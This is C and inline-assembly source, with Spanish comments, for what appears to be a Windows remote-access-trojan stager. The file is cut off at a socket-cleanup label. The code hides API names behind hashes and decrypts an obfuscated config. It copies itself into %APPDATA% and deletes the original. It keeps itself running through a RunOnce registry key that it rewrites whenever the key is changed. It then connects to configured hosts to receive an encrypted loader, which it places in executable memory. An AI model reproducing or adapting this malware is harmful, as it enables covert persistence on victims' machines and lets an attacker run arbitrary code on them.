/*###############################################################################
** Compilación condicionada:
**    Dependiendo de las opciones aquí seleccionadas el código 
**    resultante tendrá unas características u otras.
**    Para más información sobre éstas revisar 'macros.h'.
**    ¡¡¡EDITAR 'macros.h' PARA SELECCIONAR LA COMPILACIÓN CONDICIONADA!!!
*###############################################################################*/
#include "macros.h"
INCLUDE_PYSRC(..\builder\intrabuilder.py)

#define API_DEFINE(...) PYTHON_FUNCTION()
#define VAR_DEFINE(...) PYTHON_FUNCTION()
#define STACKSIZE(...) PYTHON_FUNCTION()
#define MY_CONFIG(...) PYTHON_FUNCTION()
#define DEBUG_MSG(...) PYTHON_FUNCTION()
#define _EMIT_ARRAY(...) PYTHON_FUNCTION()

//No queremos que muestre el warning de etiqueta sin referencia, 
//ya que las usamos para mejorar la legibilidad del código
#pragma warning(disable:4102)
//No queremos el warning de EMMS, sabemos que estamos haciendo.
#pragma warning(disable:4799)

#define WINVER 0x0501
#define _WIN32_WINNT 0x0501

#include <Windows.h>
#include <stdio.h>

DEFINE_PYSRC(
def _EMIT_ARRAY(a):
    return EMIT_ARRAY(a)

def MY_CONFIG():
    blob = aes128Blob(bType    = PLAINTEXTKEYBLOB,
                      bVersion = CUR_BLOB_VERSION,
                      wReserved= 0x0000,
                      aiKeyAlg = CALG_AES_128,
                      keySize  = 0x00000010,
                      keyData  = [0x63, 0x08, 0x5B, 0x66, 0xDB, 0xD6, 0x33, 0x31, 0xF3, 0x80, 0xD9, 0x75, 0x59, 0xEC, 0x38, 0x04])

    b = Builder()
    b.addBlob(blob)
    b.addString("Stealth")
    b.addString("Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce")
    b.addTargets([[0x932B, "127.0.0.1"]])
    b.addDword(0)
    b.addDword(0)
    b.padd()
    b.XorCrypt()
    return EMIT_ARRAY(b.result())
)DEFINE_END()

#ifndef DEBUG
#pragma comment(linker, "/NODEFAULTLIB")
#else
#pragma comment(linker, "/SUBSYSTEM:CONSOLE")
#endif

void LoadFunctions(DWORD numHashes);

void __declspec(naked) main(){
    __asm{
        /*###############################################################################
        ** Obtención del Delta offset:
        **    Obtenemos la posición relativa de nuestro código.
        **    Utilizamos un código poco común que utiliza la FPU.
        **    Primero utilizamos 'fldXX' para actualizar el entorno de FPU
        **    rellenando el item 'FPUInstructionPointer' de la estructura
        **    con la dirección de la última instrucción FPU
        **    Por último cargamos la estructura de entorno con ('fstenv') 
        **    de tal forma que el item que necesitamos quede en esp y lo sacamos a edi.
        **    NOTAS{
        **        1: Se harcodean los opcodes para evitar tanto la comprobación
        **        de errores de FP como para evitar el byte superfluo que añade
        **        el visualC
        **    }
        *###############################################################################*/
find_delta:
        /* Hay que cargar una constante que no genere ceros en la configuración
        D9EB           FLDLN2       MM7-> B172 17F7 D1CF 79AC
        D9E9           FLDLG2       MM7-> 9A20 9A84 FBCF F799
        D9EA           FLDL2E       MM7-> B8AA 3B29 5C17 F0BC
        D9EC           FLDL2T       MM7-> D49A 784B CD1B 8AFE
        D9ED           FLDPI        MM7-> C90F DAA2 2168 C235
        */
		fldln2 //60 DB 14 24 D9 34 24 9C 61 81 EB 
#ifdef SC_DELTA
        _EMIT_ARRAY([0xD9, 0x74, 0x24, 0xF4])				//PERDIDA DE STACK (REVISAR)
        pop  edi
        #ifdef SC_NULL
        add  edi, K
        sub  edi, (find_delta+K)
        #else //SC_NULL
        sub  edi, find_delta
        #endif //SC_NULL
        DEBUG_MSG("sDELTA", ["edi"])
#endif //SC_DELTA

        //Saltamos los hashes y funciones.
        jmp  over_hashes
    }
#pragma region constantes
        /*###############################################################################
        ** Constantes:
        **    Aquí se declaran las constantes utilizadas en el código{
        **        HASHES    : Hashes de las APIs de las que se obtendrá la dirección.
        **        VARS      : Variables utilizadas.
        **        KEY       : Utilizado para identificar al cliente en el 'handshake'.
        **        HOST      : Dónde se conectará el socket.
        **    }
        *###############################################################################*/
#pragma region hashes
kernel32_symbol_hashes:
        #define kernel32_count  15
        API_DEFINE("LoadLibraryA")
        API_DEFINE("Sleep")
        API_DEFINE("ExitProcess")
        API_DEFINE("LocalAlloc")
        API_DEFINE("VirtualAlloc")
        API_DEFINE("CreateMutexA")
        API_DEFINE("GetTempFileNameA")
        API_DEFINE("CopyFileA")
        API_DEFINE("DeleteFileW")
        API_DEFINE("WinExec")
        API_DEFINE("CreateFileA")
        API_DEFINE("ReadFile")
        API_DEFINE("SetFilePointer")
        API_DEFINE("RegisterWaitForSingleObject")
        API_DEFINE("CreateEventExW")

ws2_32_symbol_hashes:
        #define ws2_32_count    7
        API_DEFINE("socket")
        API_DEFINE("connect")
        API_DEFINE("WSAStartup")
        API_DEFINE("closesocket")
        API_DEFINE("inet_addr")
        API_DEFINE("gethostbyname")
        API_DEFINE("recv")

advapi32_symbol_hashes:
        #define advapi32_count    7
        API_DEFINE("CryptAcquireContextA")
        API_DEFINE("CryptSetKeyParam")
        API_DEFINE("CryptImportKey")
        API_DEFINE("CryptDecrypt")
        API_DEFINE("RegSetKeyValueW")      
        API_DEFINE("RegOpenKeyExA")    
        API_DEFINE("RegNotifyChangeKeyValue")

#pragma endregion

#pragma region VARS
        VAR_DEFINE("RegHandle")
        VAR_DEFINE("RegCB")
        VAR_DEFINE("RegWatcher")
        VAR_DEFINE("RegEvent")
        VAR_DEFINE("RegKey")
        VAR_DEFINE("RegPath")
        VAR_DEFINE("CommandLine")
        VAR_DEFINE("APPDATA")
        VAR_DEFINE("DAT_NFO")
        VAR_DEFINE("pHOST")
        VAR_DEFINE("pKEY")
        VAR_DEFINE("pMUTEX")
        VAR_DEFINE("hProv")
        VAR_DEFINE("hKey")
        VAR_DEFINE("hSocket")
        VAR_DEFINE("pBuff")
        VAR_DEFINE("buffLen")
        VAR_DEFINE("TARGETS")
        VAR_DEFINE("PORT")
#pragma endregion
#pragma endregion
    __asm{
over_hashes:
        jmp over_fncs
        /*###############################################################################
        ** Subrutina que copia de ESI a EDI pasando 
        ** de UNICODE a ASCII hasta encontrar el caracter que haya en DL o un \0
        *###############################################################################*/
copy_uni_to_ascii_filter:
copy_next:
        lodsb                           //Cargamos byte
        cmp  al, dl                     //¿Es el caracter que buscamos?
        jz copy_done                    //Si lo es hemos acabado...
        test al, al                     //Es el último?
        jz copy_done                    //Si lo es hemos acabado...
        stosb                           //Guardamos el byte
        inc esi                         //Saltamos el nulo
        jmp copy_next                   //Siguiente carácter
copy_done:
        ret
        /*###############################################################################
        ** Subrutina que carga el siguiente Target de la estructura
        *###############################################################################*/
load_next_target:
        mov  edi, [ebp+_pHOST]          //ESI = &HOSTn
        xor  eax, eax                   //EAX = 0
        mov  ecx, -1                    //v
        repne scasb                     //> Buscamos el final de la cadena
        mov  esi, edi                   //ESI = EDI
        lodsw                           //EAX = AX = PORT(n+1); ESI = &HOST(n+1)
#ifdef DEBUG
        bswap eax
        shr   eax, 16
        DEBUG_MSG("sTARGET", ["esi", "eax"])
        shl   eax, 16
        bswap eax
#endif
        shl  eax, 16                    //
        test eax, eax                   //Comprobamos si es el último target
        mov  al, AF_INET                //> Formateamos el puerto
        mov  [ebp+_PORT], eax           //Guardamos puerto
        mov  [ebp+_pHOST], esi          //Guardamos host
        jnz  get_out                    //Si no es el último devolvemos
        mov  ecx, [ebp+_TARGETS]        //v
        dec  ecx                        //>ECX-- para forzar a leer el primer target
        mov  [ebp+_pHOST], ecx          //> De ser el último apuntamos al inicio y devolvemos 0 en EAX
        xor  eax, eax
get_out:
        ret

#ifdef ERR_CHECK
        /*###############################################################################
        ** gtfo:
        **    Método para salir en cualquier momento de la ejecución sin mostrar ningún
        **    error crítico, además es usado para tener una mejor idea de lo ocurrido
        *###############################################################################*/
gtfo:
        pop  edx
        test eax, eax
        jne  conti
        call [ebp+_ExitProcess]
conti:
        add  esp, 0x4
        push edx
        ret
#endif //ERR_CHECK

CreateBuff:
        pushc(1024)
        push LPTR                       //v
        call [ebp+_LocalAlloc]          //>VirtualAlloc(LPTR, SIZE)
        DEBUG_MSG("sBUFFER", ["eax"])
#ifdef ERR_CHECK
        push ERR_MEM                    //v
        call gtfo                       //>(EAX!=0)? No ha habido error, tenemos donde guardar los datos
#endif //ERR_CHECK
        ret
#ifdef MELT
SkipQuote:
        cmp BYTE PTR[esi], '"'          //v
        jne DoNotSkip                   //v
        inc  esi                        //v
        inc  esi                        //> Saltamos la primera comilla
DoNotSkip:
        ret
#endif //MELT
#ifdef AUTOSTART
        RegWatch: //VOID CALLBACK WaitOrTimerCallback(_In_  PVOID lpParameter, _In_  BOOLEAN TimerOrWaitFired);
        pushad
		mov  ebp, [esp+0x20+4]			//Obtenemos el puntero a nuestro stack
        cdq
        push ebp                        //v
        add  DWORD PTR[esp], _RegKey    //v
        pushc(STANDARD_RIGHTS_READ | KEY_NOTIFY | KEY_SET_VALUE) //v
        push edx                        //V
        push [ebp+_RegPath]             //v
        pushc(0x80000001)               //v
        call [ebp+_RegOpenKeyExA]       //> RegOpenKeyExA(HKEY_CURRENT_USER, &RegPath, NULL, KEY_NOTIFY | KEY_SET_VALUE, &RegKey);

        cdq
        mov  esi, [ebp+_CommandLine]
repeat_count:
        inc  edx
        lodsw
        test ax, ax
        jne repeat_count

        shl  edx, 1
		push edx
		push [ebp+_CommandLine]
		push REG_SZ
		push [ebp+_pMUTEX]
        cdq
        push edx
		push [ebp+_RegKey]
        call [ebp+_RegSetKeyValueW]     //> RegSetKeyValueW(RegKey, NULL, " ", REG_SZ, &MyPath, NULL(ignored));

        cdq                             //EDX = 0
        push 1                          //v
        push [ebp+_RegEvent]            //v
        push REG_NOTIFY_CHANGE_LAST_SET //v
        push edx                        //v
        push [ebp+_RegKey]              //v
        call [ebp+_RegNotifyChangeKeyValue] //> RegNotifyChangeKeyValue(RegKey, FALSE, REG_NOTIFY_CHANGE_LAST_SET, RegEvent, TRUE);
        DEBUG_MSG("sREG")
        popad
        ret 0x8
#endif //AUTOSTART
over_fncs:
        //Saltamos sobre la configuración
        jmp  to_start
    }

config_start:
KEY:       //typedef struct aes128Blob{
            //BLOBHEADER{
                /*bType*/       //EMIT_BYTE(PLAINTEXTKEYBLOB)
                /*bVersion*/    //EMIT_BYTE(CUR_BLOB_VERSION)
                /*wReserved*/   //EMIT_WORD(0)
                /*aiKeyAlg*/    //EMIT_DWORD(CALG_AES_128)
            //}
            /*keySize*/         //EMIT_DWORD(0x10)
            /*keydata[16]*/     //EMIT_BYTE_ARRAY((0x63) (0x08) (0x5B) (0x66) (0xDB) (0xD6) (0x33) (0x31) (0xF3) (0x80) (0xD9) (0x75) (0x59) (0xEC) (0x38) (0x04))    
            //SHA1("karcrack:1234")
        //}
        /*
MUTEX:  EMIT_BYTE_ARRAY(('S') ('t') ('e') ('a') ('l') ('t') ('h')(0))
HOSTS:  
PORT1:  EMIT_WORD(0x932B)
HOST1:  EMIT_BYTE_ARRAY(('1') ('2') ('7') ('.') ('0') ('.') ('0') ('.') ('1')(0))
PORT2:  EMIT_WORD(0x932B)
HOST2:  EMIT_BYTE_ARRAY(('l') ('o') ('c') ('a') ('l') ('h') ('o') ('s') ('t')(0))
        EMIT_DWORD(0)
        EMIT_DWORD(0)
        */

        MY_CONFIG( )

#define CONFIG_SIZE 128
config_end:

    __asm{
to_start:
        /*###############################################################################
        ** Creación del stack de direcciones:
        **    Lo primero que hacemos es reservar espacio en el stack para almacenar
        **    las direcciones de APIs, también las variables.
        **    Utilizaremos durante todo el código EBP como puntero al inicio de este
        **    'stack de direcciones'
        *###############################################################################*/
        add  esp, - STACKSIZE( )
        lea  ebp, [esp+STACK_OFFSET]
#ifdef SC_DELTA
        push edi                        //Guardamos el Delta
#endif //SC_DELTA
        /*###############################################################################
        ** Carga de APIs:
        **    Iniciamos el proceso de carga de APIs.
        **    Primero se obtendrá el puntero a kernel32 después se cargarán sus funciones,
        **    entre ellas LoadLibraryA(), con ésta se cargarán el resto de librerias.
        *###############################################################################*/
        
        //Obtenemos en eax la dirección de kernel32
        push 0x30                       //v
        pop  esi                        //v
        lods DWORD PTR FS:[esi]         //>EAX = &(PEB)
        push [eax+0x0C]                 //Guardamos en el stack PEB->Ldr
        mov  eax, [eax+0x10]            //EAX = &RTL_USER_PROCESS_PARAMETERS
        /*###############################################################################
        ** Obtención de %APPDATA%:
        ** Aprovechamos que hemos sacado el PEB para obtener kernel32 y
        ** recorremos el bloque de environments en busca de \0APPDATA=*
        *###############################################################################*/
        mov  edi, [eax+0x44]            //v
        mov  [ebp+_CommandLine], edi    //>Almacenamos el puntero a CommandLine
        mov  esi, [eax+0x48]            //ESI = Environment

hash_start:
        xor  ebx, ebx                   //EBX = 0 = hash
redo:   lodsw                           //AX = Environment[i]; i++
        test al, al                     //(AL == 0)?
        jz   hash_start                 //Si el caracter es nulo volvemos a empezar...
next:   xor  bl, al                     //hash ^= Environment[i]
        cmp  al, '='                    //(AL == '=')?
        jne  redo                       //Si no se trata de un igual cargamos el siguiente caracter
        cmp  bl, 0x6C                   //Si es un igual comprobamos si el hash equivale al de "APPDATA"
        jne  redo                       //En caso negativo seguimos buscando.
appdata_found:

        //ESI = &APPDATA
        mov  [ebp+_APPDATA], esi        //Almacenamos el puntero a APPDATA (UNICODE)
        DEBUG_MSG("sAPPDATA", ["esi"])
        pop  esi                        //ESI = PEB->Ldr
        mov  esi, [esi+0x1C]            //ESI = PEB->Ldr.InInitOrder[0]
next_module:
        mov  eax, [esi+0x20]            //EAX = PEB->Ldr.InInitOrder[X].module_name (UNICODE)
        cmp  [eax+0xC], '3'             //module_name[6] == '3'?
        mov  eax, [esi+0x08]            //EAX = PEB->Ldr.InInitOrder[X].base_address
        mov  esi, [esi]                 //ESI = PEB->Ldr.InInitOrder[X].flink (NextModule)
        jne  next_module
find_kernel32_finished:
#ifdef SC_DELTA
        pop  edi                        //Restauramos EDI
        push edi                        //Y guardamos otra vez
#endif //SC_DELTA
        movr(esi, kernel32_symbol_hashes)// Puntero al primer hash
        movr(edi, LoadFunctions)        // Puntero a LoadFunctions()

        sub  ebp, STACK_OFFSET          //Apuntamos al inicio de Stack
        //Cargamos las APIs de kernel32 en la pila a partir de los hashes
        DEBUG_MSG("sCK32", ["kernel32_count"])
        DEBUG_MSG("sADDR", ["eax"])
        push kernel32_count             //v Número de hashes de kernel32
        call edi                        //>LoadFunctions(kernel32_count);
        mov  ebx, [ebp-(kernel32_count*4)+_LoadLibraryA+STACK_OFFSET]//EBX = &LoadLibraryA
        DEBUG_MSG("sOK")

        //Obtenemos la BaseAddress de ws2_32
        pushc('23')                     //v
        pushc('_2sw')                   //v Metemos el nombre del API en el stack (ANSI)
        DEBUG_MSG("sCW32", ["ws2_32_count"])
        push esp                        //v
        call ebx                        //>LoadLibraryA("ws2_32");
        DEBUG_MSG("sADDR", ["eax"])
        pop  edx                        //v
        pop  edx                        //>Restauramos la pila sacando la cadena ANSI
        
        //Cargamos las APIs de ws2_32 en la pila a partir de los hashes
        push ws2_32_count               //v Número de hashes de ws2_32
        call edi                        //>LoadFunctions(ws2_32_count);
        DEBUG_MSG("sOK")
        //Obtenemos el BaseAddress de advapi32
        cdq                             //EDX = 0
        push edx                        //v
        pushc('23ip')                   //v Metemos el nombre del API en el stack (ANSI)
        pushc('avda')                   //v
        DEBUG_MSG("sCA32", ["advapi32_count"])
        push esp                        //v
        call ebx                        //>LoadLibraryA("advapi32");
        DEBUG_MSG("sADDR", ["eax"])
        add  esp, 0xC                   //Restauramos la pila eliminando la cadena ANSI

        push advapi32_count             //v Número de hashes de advapi32
        call edi                        //>LoadFunctions(advapi32_count);
        DEBUG_MSG("sOK")
        add  esp, 0xC                   //Reparamos el stack después de las llamadas a LoadFunctions()
#ifdef SC_DELTA
        pop  edi                        //Recuperamos el Delta
#endif //SC_DELTA
        //Volvemos a apuntar al inicio del stack de APIs
        sub  ebp, (kernel32_count+ws2_32_count+advapi32_count)*4 - STACK_OFFSET

        //Creamos un buffer para almacenar la configuración cifrada y luego descifrarla.
        movr(esi, config_start)         //Cargamos la posición del inicio de la config

		pushc(RegWatch)
		add  [esp], edi
		pop  dword ptr[ebp+_RegWatcher]

        /*###############################################################################
        **        TRAS ESTE PUNTO YA NO NECESITAMOS ALMACENAR EL DELTA (EDI)
        *###############################################################################*/

        /*###############################################################################
        ** Descifrado y almacenado de la configuración:
        **   - Se descifra la configuración usando un packet XOR
        *###############################################################################*/
        call CreateBuff                 //>CreateBuff();

        mov  edx, eax                   //EDX = &Buffer
        xor  edi, edi                   //EDI = 0
#pragma region DECRYPT_CONFIG
        xor  ecx, ecx                   //ECX = 0
xornext:
        lea  ebx, [esi+(ecx*8)]         //EBX = &(QWORD)config_start[i]
        movq mm0, QWORD PTR[ebx]        //MM0 = (QWORD)*EBX
        pxor mm0, mm7                   //MM0^= MM7
        movq QWORD PTR[edx], mm0        //*(QWORD)Buffer = MM0
        add  edx, 8                     //Buffer+=8
        inc  ecx                        //Siguiente bloque
        cmp  DWORD PTR[edx-4], edi      //Comprobamos si tenemos un DWORD 0 final
        jnz  xornext                    //Si no es el bloque final pasamos al siguiente
#pragma endregion

        //Guardamos los punteros a los valores descifrados
        mov  [ebp+_pKEY], eax           //
        lea  esi, [eax+0x1C]            //ESI = &mutex
        mov  [ebp+_pMUTEX], esi         //
#ifdef AUTOSTART
        add  esi, 0x8                   //ESI = &RegPath
        mov  [ebp+_RegPath], esi        //
#endif
        cdq                             //EDX = 0
repeat: inc  esi
        mov  dl, BYTE PTR[esi]          //DL  = RegPath[n]
        test dl, dl                     //v
        jnz  repeat                     //> Saltamos el RegPath
        mov  [ebp+_pHOST], esi          //
        inc  esi                        //
        mov  [ebp+_TARGETS], esi        //

        /*###############################################################################
        **                          Comprobación del Mutex
        *###############################################################################*/
        DEBUG_MSG("sMTX", ["[ebp+_pMUTEX]"])
        cdq                             //EDX = 0
        push [ebp+_pMUTEX]              //v
        push edx                        //v
        push edx                        //v
        call [ebp+_CreateMutexA]        //>CreateMutexA(NULL, False, &MUTEX)
        push 0x34                       //v
        pop  esi                        //v
        lods DWORD PTR FS:[esi]         //>EAX = GetLastError()
#ifdef ERR_CHECK
        xor  al, 0xB7
        push ERR_MTX
        call gtfo
#else //ERR_CHECK
        test eax, eax
        jz  nomtx
        DEBUG_MSG("sERR")
        push ERR_MTX
        call [ebp+_ExitProcess]
nomtx:
#endif //ERR_CHECK
        /*###############################################################################
        ** Realizamos el Melt:
        **   - Primero nos copiamos a %APPDATA%\XXXX.exe
        **   - Después ejecutamos la copia pasándole de parámetro nuestra ruta.
        **
        **   - La copia se encarga de eliminarnos.
        *###############################################################################*/
        /*###############################################################################
        **      EN CASO DE NO HABER MELT NECESITAMOS IGUALMENTE OBTENER 
        **                LA RUTA A LOS DATOS OFFLINE
        *###############################################################################*/
#ifdef MELT
        mov  edi, [ebp+_CommandLine]    //EDI = &CommandLine
        mov  esi, edi                    //v
        call SkipQuote                    //> Saltamos la primera comilla de hacer falta
        mov  edi, esi                    //^
        push edi                        //Guardamos &CommandLine para luego
        mov  esi, [ebp+_APPDATA]        //ESI = &APPDATA
        call SkipQuote                    //> Saltamos la primera comilla de haberla
        cdq                             //EDX = 0
        //Comprobamos si estamos en %APPDATA%
next_char:
        cmpsw                           //Comprobamos el caracter y pasamos al siguiente
        je   next_char                  //Si coincide probamos con el siguiente
        cmp  BYTE PTR[esi-2], dl        //Si no coincide miramos si es el ultimo char de APPDATA
        je   do_not_copy                //Si es el \0 la ruta coincide y por lo tanto no nos copiamos

        call CreateBuff                 //Creamos Buffer para las rutas

        mov  edi, eax                   //EDI = EAX
        mov  esi, [ebp+_APPDATA]        //ESI = &APPDATA
        mov  [ebp+_APPDATA], edi        //Guardamos en _APPDATA la nueva ruta

        //Copiamos %APPDATA% en el buffer
        mov  al, '"'                    //v
        stosb                           //>Metemos la comilla de apertura
        cdq                             //v EDX = 0
        call copy_uni_to_ascii_filter   //>Y pasamos de UNICODE a ASCII hasta encontrar un \0

        //Por ahora &_APPDATA = >>"%APPDATA%<<
        //Añadimos a %APPDATA% un nombre al azar.
        cdq                             //EDX = 0
        push edi                        //v
        push edx                        //v
        push edx                        //v
        push edi                        //v
        call [ebp+_GetTempFileNameA]    //>GetTempFileNameA(Buff, NULL, 0, Buff);
        mov  DWORD PTR[edi+5], 'exe.'   //Reemplazamos la extensión a ".exe"
        
        //Ahora &_APPDATA = >>"%APPDATA%\XXXX.exe\0<<
        pop  esi                        //Recuperamos el puntero a &CommandLine
        lea  edi, [edi+11]              //Saltamos el \0\0 que luego será comilla de cierre y espacio
        push edi                        //Guardamos el puntero para luego

        mov  dl, '"'                    //v
        call copy_uni_to_ascii_filter   //> Pasamos de UNICODE a ASCII hasta encontrar una comilla

        //&_APPDATA = >>"%APPDATA%\XXXX.exe\0\0%MyPath%<<
        pop  edi                        //Recuperamos el puntero a nuestra ruta
        cdq                             //EDX = 0
        push edx                        //v
        push [ebp+_APPDATA]             //v
        inc  DWORD PTR[esp]             //(Saltamos la comilla)
        push edi                        //v
        call [ebp+_CopyFileA]           //>CopyFileA(&MyPath, &APPDATA, false);

        dec  edi                        //v
        dec  edi                        //>Volvemos a \0\0 que se transformará a >>" <<
        mov  ax, ' "'                   //v
        stosw                           //>Metemos las comillas y el espacio

        //&_APPDATA = >>"%APPDATA%\XXXX.exe" %MyPath%<<
        //Ejecutamos nuestra copia pasándole nuestra ruta
        push 1                          //V
        push [ebp+_APPDATA]             //v
        call [ebp+_WinExec]             //>WinExec(&_APPDATA, SW_SHOWNORMAL);

        push MELT_DONE                  //v
        call [ebp+_ExitProcess]         //>ExitProcess(MELT_DONE);

do_not_copy://(Somos la copia)
        //Vamos a finalizar el Melt eliminando el fichero que se nos pasa
        pop  esi                        //Recuperamos el inicio &CommandLine (=LIMPIAR STACK)
        //EDI = Puntero a nuestro nombre de ejecutable
        mov  cl, 0x7F                   //TAMAÑO MÁXIMO PARA NUESTRO NOMBRE + EXT
        xor  eax, eax                   //v
        mov  al, '"'                    //> EAX = '"'
        repne scasw                     //>Buscamos en EDI la comilla
        inc  edi                        //v
        inc  edi                        //>Saltamos el espacio
        //EDI = Puntero al fichero a eliminar
        push edi                        //v
        call [ebp+_DeleteFileW]         //>DeleteFileW(&file_to_delete);
#endif //MELT
        mov  esi, [ebp+_APPDATA]
        call CreateBuff
        mov  edi, eax
        mov  [ebp+_DAT_NFO], edi        //Almacenamos la ruta del .dat que contiene las cosas offline
        cdq                             //v
        call copy_uni_to_ascii_filter   //> Pasamos de UNICODE a ASCII hasta encontrar \0
        mov  al, '\\'
        stosb
        //EDI = %APPDATA%
        //OBTENEMOS NUESTRO NOMBRE Y LE CAMBIAMOS LA EXTENSION
        mov  edx, edi
        mov  edi, [ebp+_CommandLine]
save:   mov  ebx, edi
again:  xor  eax, eax
        scasw
        je  found
        cmp WORD PTR[edi-2], '\\'
        jne again
        jmp save
found:
        mov  esi, ebx
        mov  edi, edx
        mov  dl, '"'
        call copy_uni_to_ascii_filter
        mov  DWORD PTR[edi-4], 'tad.'   //Cambiamos la extensión a .dat

        DEBUG_MSG("sOFFLINE", ["edi"])

        /*###############################################################################
        ** Activamos la persistencia:
        **   - Creamos un evento.
        **   - Llamamos al callback por primera vez para que cree la clave y registre el
        **      evento con su callback.
        *###############################################################################*/
#ifdef AUTOSTART
        pushc(EVENT_ALL_ACCESS)         //v
        push 1                          //v
        cdq                             //EDX = 0
        push edx                        //v
        push edx                        //v
        call [ebp+_CreateEventExW]      //v
        mov[ebp + _RegEvent], eax       //> RegEvent = CreateEventExW(NULL, NULL, CREATE_EVENT_MANUAL_RESET, EVENT_ALL_ACCESS);

        push WT_EXECUTEINWAITTHREAD
		push INFINITE
		push ebp
		push [ebp+_RegWatcher]
		push [ebp+_RegEvent]
		push ebp
		add [esp], _RegCB
		call [ebp+_RegisterWaitForSingleObject]
        //> RegisterWaitForSingeObject(&RegEvent, RegEvent, &RegWatch, EBP(stack propio), INFINITE, WT_EXECUTEINWAITTHREAD);
        cdq                             //EDX = 0
        push edx                        //
        push ebp                        //
        call RegWatch                   //> Llamamos al callback manualmente para crear por primera vez si es necesario

#endif //AUTOSTART
        cdq                             //EDX = 0
        push edx                        //v
        push edx                        //v
        push OPEN_EXISTING              //v
        push edx                        //v
        push edx                        //v
        pushc(GENERIC_READ)             //v
        push [ebp+_DAT_NFO]             //v
        call [ebp+_CreateFileA]         //>CreateFileA(&DAT_PATH, GENERIC_READ, 0, NULL, OPEN_EXISTING, 0, NULL);
        mov  [ebp+_DAT_NFO], eax        //Guardamos el handle al fichero

#define BUFF_SIZE 0x5000
_cont:  xor  eax, eax                   //EAX = 0
        mov  ah, 0x50                   //EAX = BUFF_SIZE
        cdq                             //EDX= 0
        push PAGE_EXECUTE_READWRITE     //v
        pushc(MEM_COMMIT | MEM_RESERVE) //v
        push eax                        //v
        push edx                        //v
        call [ebp+_VirtualAlloc]        //> VirtualAlloc(0, BUFF_SIZE, MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)
        mov  [ebp+_pBuff], eax          //pBuffer = EAX

        /*###############################################################################
        ** Creación del socket:
        **    Una vez cargadas todas las APIs que necesitaremos de las distintas librerías
        **    creamos el socket para conectarnos al cliente e iniciar la autentificación.
        **    Otra vez más utilizamos el stack para evitar crear buffers innecesarios.
        *###############################################################################*/

        //Iniciamos el socket
        xor  ebx, ebx                   //EBX = 0
        mov  bl, 0x19                   //EBX = 0x19
        shl  ebx, 0x4                   //EBX = 0x190
        sub  esp, ebx                   //Reservamos espacio suficiente en la pila para WSADATA
        push esp                        //v
#ifdef SC_NULL
        push 2                          //v
        add  [esp+1], 2                 //v VersionRequested = 2.2
#else //SC_NULL
        push 0x202                      //v VersionRequested = 2.2
#endif //SC_NULL
        call [ebp+_WSAStartup]          //>WSAStartup(0x202, &WSADATA);
        add  esp, ebx                   //Restauramos la pila eliminando WSADATA de ésta

newSocket:
        //Creamos el socket AF_INET y SOCK_STREAM
        xor  edx, edx                   //EDX = 0
        push edx                        //v
        inc  edx                        //v EDX = 1 (SOCK_STREAM)
        push edx                        //v
        inc  edx                        //v EDX = 2 (AF_INET)
        push edx                        //v
        call [ebp+_socket]				//>socket(AF_INET, SOCK_STREAM, 0);
        mov  [ebp+_hSocket], eax        //hSocket = EAX

        DEBUG_MSG("sNEWSOCKT", ["eax"])

        jmp  connect_loop
sleep_and_loop:
        call load_next_target           //> Cargamos el primer target
        test eax, eax                   //v
        jne  do_the_loop                //>Si hemos recorrido ya todos los targets veamos si tenemos version offline
        cmp  DWORD PTR[ebp+_DAT_NFO], -1//v
        je   do_the_loop                //>Si el fichero offline no existe seguimos intentado conectar
        //Apuntamos al inicio del fichero
        xor  edx, edx                   //EDX = 0
        push edx                        //v(FILE_BEGIN = 0)
        push edx                        //v
        push edx                        //v
        push [ebp+_DAT_NFO]             //v
        call [ebp+_SetFilePointer]      //>SetFilePointer(hFile, 0, 0, FILE_BEGIN);
        
        //Leemos
        cdq                             //EDX = 0
        push edx                        //v
        lea  edx, [ebp+_buffLen]        //v
        push edx                        //> &buff_len
        xor  eax, eax                   //v
        mov  ah, 0x50                   //> EAX = BUFF_SIZE
        push eax                        //v
        push [ebp+_pBuff]               //v
        push [ebp+_DAT_NFO]             //v
        call [ebp+_ReadFile]            //>ReadFile(hFile, &pBuff, 5000, &buff_len, NULL)
        test eax, eax                   //EAX != 0?
        jnz  init_decrypt               //Si no ha habido error al leer procedemos a descifrar

do_the_loop:
#ifdef SC_NULL
        push 0x7F                       //v
        shl  DWORD PTR[esp], 0x3        //v
#else //SC_NULL
        push 0x3F8                      //v
#endif //SC_NULL
        call [ebp+_Sleep]               //Sleep(0x3F8);
connect_loop:
        DEBUG_MSG("sCON", ["[ebp+_pHOST]"])
        //Obtenemos la dirección válida
        push [ebp+_pHOST]               //v
        call [ebp+_gethostbyname]       //>gethostbyname(&HOST);
        
        test eax, eax                   //v
        jz  sleep_and_loop              //> Si ha habido algún error obteniendo el HOST repetimos

        add  eax, 0x20                  //EAX = hostent.h_name
        push eax                        //v
        call [ebp+_inet_addr]           //>inet_addr(hostent.h_name);

        //Construimos la sockaddr_in en la pila
        push eax                        //push IP
        push [ebp+_PORT]                //>push PORT
        mov  ebx, esp                   //EBX = &sockaddr_in

        push 0x10                       //v size(sockaddr_in)
        push ebx                        //v
        push [ebp+_hSocket]             //v
        call [ebp+_connect]             //>connect(hSocket, &sockaddr_in, size(sockaddr_in));
        pop  ebx                        //v
        pop  ebx                        //>Reparamos la pila eliminando sockaddr_in
        test eax, eax                   //v
        jl   sleep_and_loop             //>(EAX<0)? (Error, reseteemos)
connected:
        DEBUG_MSG("sOK")
        /*###############################################################################
        ** Recepción de datos desde el cliente:
        **  Una vez establecida la conexión con éxito intentamos recibir 
        **  el paquete inicial compuesto de:
        **      IV+checksum+LOADER_IAT+CARGADOR
        **  Siendo cada uno:
        **      *IV(16bytes)    : Vector de inicialización para el cifrado
        **{{
        **      *checksum       : checksum de todo el payload, para evitar error crítico al ejecutar.
        **      *LOADER     : Loader de Arkangel encargado de descargar, ubicar y ejecutar el cargador de plugins.
        **}}
        **  Lo envuelto entre {{*}} viene cifrado en AES-128-cbc usando como clave el hash SHA1(pass)
        *###############################################################################*/
recibir:
        cdq                             //EDX = 0
        push edx                        //v
        xor  eax, eax                   //v
        mov  ah, 0x50                   //> EAX = BUFF_SIZE
        push eax                        //v
        push [ebp+_pBuff]               //v
        push [ebp+_hSocket]             //v
        call [ebp+_recv]                //>recv(hSocket, pBuff, BUFF_SIZE, MSG_WAITALL);

        mov  [ebp+_buffLen], eax        //buffLen = EAX
        cmp  eax, 0x7F                  //> Suficientes Bytes para no generar problemas
        jg   init_decrypt               //>EAX>7F? (Todo correcto? Procedemos a descifrar)
KillSocket:
